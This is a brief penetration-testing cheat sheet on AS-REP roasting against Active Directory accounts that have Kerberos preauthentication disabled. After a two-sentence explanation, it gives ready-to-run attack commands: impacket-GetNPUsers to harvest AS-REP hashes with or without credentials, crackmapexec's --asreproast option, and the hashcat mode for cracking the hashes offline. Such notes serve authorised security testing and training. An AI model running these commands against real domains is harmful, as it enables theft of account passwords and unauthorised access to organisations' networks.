# AS-REP Roasting
AS-REP attacks do not require the attacker to know the password for the account they are attempting to compromise. The attacker can obtain an AS-REP hash, crack it and obtain the password, provided the Kerberos preauthentication feature is disabled for that account.

When having credential for a non pre-auth account, the attacker can get the AS-REP hash for all non pre-auth accounts.

hashcat -m 18200

Without creds - users from file:
`impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>` 

With creds - all non pre-auth accounts from domain:
`impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request`
`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT.TXT>`